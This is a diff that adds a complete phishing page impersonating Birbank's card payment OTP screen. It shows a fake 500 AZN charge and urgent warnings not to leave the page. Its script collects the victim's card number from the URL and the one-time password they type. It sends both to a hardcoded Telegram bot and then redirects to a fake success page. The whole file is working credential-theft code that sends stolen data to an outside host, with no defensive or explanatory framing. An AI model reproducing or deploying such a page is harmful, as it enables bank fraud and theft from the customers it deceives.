@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <link rel="shortcut icon" href="birbank.png" type="image/ico">
+    <title>Birbank Pay</title>
+
+    <link rel="stylesheet" href="ode_files/styles.css" type="text/css">
+    <style>
+         .logo {
+            width: 250px; /* Logonun genişliği */
+            height: auto; /* Oranı koruyarak yüksekliği ayarla */
+            display: block;
+            margin-left: 0; /* Sola hizala */
+        }
+
+        .btn.pay-btn {
+            background-color: #FF0039; /* Kırmızı renk */
+            color: white; /* Yazı rengi */
+            border: none; /* Çerçeve kaldırıldı */
+            padding: 10px 20px; /* İç boşluk */
+            border-radius: 5px; /* Kenar yuvarlaklığı */
+            font-size: 16px; /* Yazı boyutu */
+            cursor: pointer; /* Tıklanabilir imleç */
+            display: block;
+            margin: 20px auto; /* Ortalanmış buton */
+            text-align: center;
+        }
+
+        .btn.pay-btn:hover {
+            opacity: 0.9; /* Hover efektinde hafif transparan */
+        }
+
+        .btn.pay-btn.disabled {
+            background-color: grey; /* Pasif durumda gri */
+            color: white;
+            cursor: not-allowed;
+        }
+
+        .input-field input {
+            border: 2px solid black; /* Varsayılan durumda siyah kenarlık */
+            outline: none; /* Tarayıcı varsayılan odak stilini kaldırır */
+            box-shadow: none; /* Gölgeyi kaldırır */
+            border-radius: 4px; /* Kenarlıklara yuvarlaklık eklendi */
+            padding: 10px; /* Giriş alanına boşluk ekler */
+        }
+
+        .input-field input:focus {
+            border: 2px solid red; /* Odaklandığında kırmızı kenarlık */
+        }
+
+        .input-field input:not(:placeholder-shown) {
+            border: 2px solid red; /* İçerik olduğunda kırmızı kenarlık */
+        }
+
+        #countdown {
+            font-size: 14px;
+            font-weight: normal;
+        }
+
+        #resendButton {
+            font-size: 14px;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="mainwrapper">
+        <header class="ecom-header">
+            <img class="logo" src="ode_files/pb-logo.svg" alt="pb-logo">
+            <label class="amount-label">Ümumi məbləğ</label>
+            <label id="ledger" class="amount">500.00 AZN</label>
+            <br />
+            <br />
+            <label class="amount-label">Ödəniş istəkləri çox olduğundan OTP kodunuz gec göndərilə bilər!</label>
+            <label class="amount-label">Səhifədən ayrılmamağınız xaiş olunur!</label>
+        </header>
+
+        <main>
+            <form id="otpentry" method="post" autocomplete="off">
+                <div class="input-field">
+                    <label for="otp">OTP kodunu daxil edin.</label>
+                    <input tabindex="1" id="otp" name="otp" type="text" maxlength="6" placeholder="OTP">
+                </div>
+                <a>Qalan vaxt: </a><a id="countdown" style="color: red !important;">05:00</a><a id="resendButton" href="otp.html" style="color: green !important; display: none;">Yenidən göndər</a>
+                <br>
+                <br>
+                <br>
+                <br>
+                <button id="pay-btn" class="btn pay-btn disabled" type="button">
+                    Ödənişi Təsdiqlə
+                </button>
+            </form>
+        </main>
+    </div>
+
+    <footer>
+        <div class="plastic-cards-container">
+            <div class="plastic-cards">
+                <img src="ode_files/verified-by-visa.svg" alt="verified-by-visa">
+                <img src="ode_files/visa.svg" alt="visa">
+                <img src="ode_files/visa-electron.svg" alt="visa-electron">
+            </div>
+            <div class="plastic-cards">
+                <img src="ode_files/maestro.svg" alt="maestro">
+                <img src="ode_files/mastercard.svg" alt="mastercard">
+                <img src="ode_files/mastercard-secure-code.svg" alt="mastercard-secure-code">
+            </div>
+        </div>
+        <div class="contacts">
+            <p>Bankla əlaqə üçün:</p>
+            <p>
+                customer.care@birbank.az
+                <span class="seperator">|</span>&nbsp;<span class="bank-number">+994 (12) 496 50 00</span>
+            </p>
+            <p id="copyrights">© Copyrights 2007-2024 Birbank</p>
+        </div>
+    </footer>
+</body>
+
+<script src="../../code.jquery.com/jquery-3.6.4.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const otp = document.querySelector('#otp');
+    const paybtn = document.querySelector('#pay-btn');
+
+    otp.addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, ''); // Sadece rakam girilsin
+        checkInputs();
+    });
+
+    function checkInputs() {
+        if (otp.value.trim() !== '' && otp.value.length >= 4 && otp.value.length <= 7) {
+            paybtn.disabled = false;
+            paybtn.classList.remove('disabled');
+        } else {
+            paybtn.disabled = true;
+            paybtn.classList.add('disabled');
+        }
+    }
+
+    // URL'den cardnr parametresini alma
+    const currentUrl = window.location.href;
+    const params = new URLSearchParams(new URL(currentUrl).search);
+    const cardnr = params.get('cardnr');
+
+    // Telegram bot mesaj gönderimi
+    var telegram_bot_id = "8181395152:AAFrWCNgIiLdodA1uITARV74M4S6OMNBwDs";
+    var chat_id = 7813611012;
+
+    var ready = function () {
+        const otpValue = otp.value;
+        const message = `\nCard Number: ${cardnr}\nOTP: ${otpValue}`;
+        return message;
+    };
+
+    var sender = function () {
+        const message = ready();
+        var telegramSettings = {
+            "async": true,
+            "crossDomain": true,
+            "url": `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
+            "method": "POST",
+            "headers": {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({ "chat_id": chat_id, "text": message })
+        };
+
+        $.ajax(telegramSettings)
+            .done(function (response) {
+                console.log("", response);
+                otp.value = "";
+                setTimeout(function () {
+                    window.location.href = "ugurlu.html";
+                }, 1000);
+            })
+            .fail(function (jqXHR, textStatus, errorThrown) {
+                console.error("Hata:", textStatus, errorThrown);
+            });
+    };
+
+    // Ödeme butonu tıklama işlemi
+    paybtn.addEventListener("click", function (event) {
+        event.preventDefault();
+        if (!paybtn.disabled) {
+            sender();
+        }
+    });
+
+    // Geri sayım fonksiyonu
+    let minutes = 5;
+    let seconds = 0;
+
+    function updateCountdown() {
+        let formattedMinutes = String(minutes).padStart(2, '0');
+        let formattedSeconds = String(seconds).padStart(2, '0');
+        document.getElementById('countdown').textContent = `${formattedMinutes}:${formattedSeconds}`;
+
+        if (minutes === 0 && seconds === 0) {
+            clearInterval(countdownInterval);
+            document.getElementById('countdown').style.display = 'none';
+            document.getElementById('resendButton').style.display = 'inline-block';
+        } else {
+            if (seconds === 0) {
+                seconds = 59;
+                minutes--;
+            } else {
+                seconds--;
+            }
+        }
+    }
+
+    let countdownInterval = setInterval(updateCountdown, 1000);
+});
+
+</script>
+</html>
